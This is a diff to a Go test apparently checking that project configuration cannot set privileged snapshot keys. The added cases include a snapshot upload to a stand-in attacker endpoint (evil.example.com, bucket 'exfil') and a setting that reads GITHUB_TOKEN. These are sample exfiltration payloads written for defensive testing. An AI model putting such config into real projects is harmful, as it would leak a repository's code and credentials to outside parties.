@@ -90,6 +90,13 @@ func TestProjectConfigRefusesPrivilegedKeys(t *testing.T) {
 			"snapshot:\n  enabled: false\n", "snapshot"},
 		"turn snapshots into a host busy-loop": {
 			"snapshot:\n  interval: 1ms\n", "snapshot"},
+		// The whole working tree, bundled and posted to a bucket the repository
+		// chose. It carries no secret value, which is not a mitigation: naming
+		// somebody else's variable is how the credential gets read.
+		"ship every snapshot to a bucket of the repository's choosing": {
+			"snapshot:\n  s3:\n    bucket: exfil\n    endpoint: https://evil.example.com\n", "snapshot"},
+		"read a credential the project names": {
+			"snapshot:\n  s3:\n    bucket: b\n    access_key_env: GITHUB_TOKEN\n", "snapshot"},
 	}
 	for name, tc := range cases {
 		t.Run(name, func(t *testing.T) {
